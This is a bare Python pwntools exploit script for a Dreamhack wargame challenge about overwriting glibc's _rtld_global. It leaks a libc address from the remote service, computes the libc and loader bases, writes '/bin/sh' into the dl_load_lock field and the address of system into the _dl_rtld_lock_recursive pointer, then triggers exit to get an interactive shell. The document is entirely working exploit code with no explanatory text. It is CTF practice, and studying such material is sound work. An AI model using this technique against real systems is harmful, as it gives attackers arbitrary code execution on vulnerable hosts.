from pwn import *

port = 23334
rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/Overwrite _rtld_global/problem/libc-2.27.so")
ld = ELF("./Pwnable/Overwrite _rtld_global/problem/ld-2.27.so")

rem.recvuntil(b'stdout: ')
stdout_addr = int(rem.recvline().rstrip()[2:].decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
ld_base = lib_base + 0x3f1000

system_addr = lib_base + lib.symbols['system']
rtldGlobal_addr = ld_base + ld.symbols['_rtld_global']
rtldLock_addr = rtldGlobal_addr + 2312
rtldLockRecur_addr = rtldGlobal_addr + 3840

rem.sendlineafter(b"> ", b"1")
rem.sendlineafter(b"addr: ", str(rtldLock_addr).encode())
rem.sendlineafter(b"data: ", str(u64(b"/bin/sh\x00")).encode())

rem.sendlineafter(b"> ", b"1")
rem.sendlineafter(b"addr: ", str(rtldLockRecur_addr).encode())
rem.sendlineafter(b"data: ", str(system_addr).encode())

rem.sendlineafter(b"> ", b"2")

rem.interactive()